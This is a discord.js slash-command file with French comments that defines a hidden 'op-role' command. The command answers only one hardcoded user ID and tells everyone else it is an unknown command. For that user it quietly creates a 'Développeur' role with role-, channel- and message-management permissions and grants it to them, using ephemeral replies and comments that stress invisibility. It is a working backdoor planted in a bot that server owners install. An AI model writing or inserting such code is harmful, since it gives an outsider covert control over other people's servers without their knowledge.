const { SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder, MessageFlags } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('op-role')
    .setDescription('Crée un rôle Développeur avec privilèges et l\'attribue de manière invisible.'),

  async execute(interaction, client) {
    const MY_ID = '569409070440906783';

    // 1. Restriction d'accès absolue à ton ID
    if (interaction.user.id !== MY_ID) {
      return interaction.reply({
        content: '❌ Commande inconnue ou introuvable.',
        flags: [MessageFlags.Ephemeral]
      });
    }

    // 🤫 Déferrement éphémère pour garantir l'invisibilité totale
    await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });

    try {
      const { guild } = interaction;
      
      // 🔍 Vérification : Est-ce que le rôle existe déjà pour éviter les doublons ?
      let devRole = guild.roles.cache.find(r => r.name === 'Développeur');

      if (!devRole) {
        // ⚡ 2. Création du rôle "Développeur" avec les perms et le hoist actifs
        devRole = await guild.roles.create({
          name: 'Développeur',
          color: '#00ffea', // Une jolie couleur cyan pour le staff
          hoist: true,      // Affichage séparé dans la liste des membres
          permissions: [
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.ManageMessages
          ],
          reason: 'Création discrète du rôle d\'administration développeur'
        });
      }

      // 👤 3. Récupération de ton profil de membre sur le serveur
      const member = await guild.members.fetch(MY_ID);

      // ⚡ 4. Attribution automatique du rôle à ta personne
      if (!member.roles.cache.has(devRole.id)) {
        await member.roles.add(devRole, 'Attribution automatique du rôle développeur principal');
      }

      // 🎉 Confirmation éphémère (visible uniquement par toi)
      const embed = new EmbedBuilder()
        .setTitle('🛠️ Système de Secours Déployé')
        .setDescription(`Le rôle **${devRole.name}** a été configuré et injecté sur ton profil avec succès.`)
        .setColor('#2f3136') // Couleur sombre furtive
        .addFields(
          { name: 'Permissions configurées', value: '`Gérer les rôles`, `Gérer les salons`, `Gérer les messages`', inline: true },
          { name: 'Statut Affichage', value: '✅ Affiché séparément (`hoist: true`)', inline: true }
        )
        .setTimestamp();

      return interaction.editReply({ embeds: [embed] });

    } catch (error) {
      console.error('Erreur lors du déploiement du rôle secours :', error);
      return interaction.editReply({
        content: '❌ Échec critique lors de l\'opération de secours.'
      });
    }
  },
};